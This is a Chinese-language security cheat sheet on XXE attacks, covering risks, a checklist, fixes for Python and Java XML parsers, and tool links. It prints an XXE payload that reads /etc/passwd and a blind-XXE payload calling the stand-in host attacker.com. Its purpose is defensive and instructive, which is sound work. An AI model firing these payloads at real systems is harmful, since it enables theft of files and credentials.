# XXE 攻击 (XML External Entity)

> **Tier 适用**: L1 ✅

## 一句话风险

解析恶意 XML 时加载外部实体，导致任意文件读取、SSRF 或拒绝服务攻击。

## 一分钟识别清单

- [ ] 应用接受并解析 XML 输入（SOAP、RSS、XML-RPC 等）
- [ ] XML 解析器未禁用外部实体处理
- [ ] 用户可控的 XML 内容被直接解析

## 一句话防御

禁用 XML 解析器的外部实体和 DTD 处理功能。

## 推荐工具链接

- [XXEinjector](https://github.com/enjoiz/XXEinjector) - XXE 漏洞利用工具
- [portswigger-xxe-labs](https://portswigger.net/web-security/xxe) - XXE 实验室
- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

## 常见攻击场景

| 场景 | 描述 |
|------|------|
| 文件读取 | 读取 /etc/passwd 或配置文件 |
| SSRF | 通过外部实体发起内网请求 |
| Blind XXE | 带外数据外泄（OOB） |
| DoS | Billion Laughs 攻击 |

## 修复代码示例

```python
# 错误：默认解析外部实体
from lxml import etree
tree = etree.parse(xml_file)

# 正确：禁用外部实体
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
tree = etree.parse(xml_file, parser)
```

```java
// Java 修复示例
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## 检测 Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Blind XXE 检测

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>
```

## 参考

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [XML Security Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md)
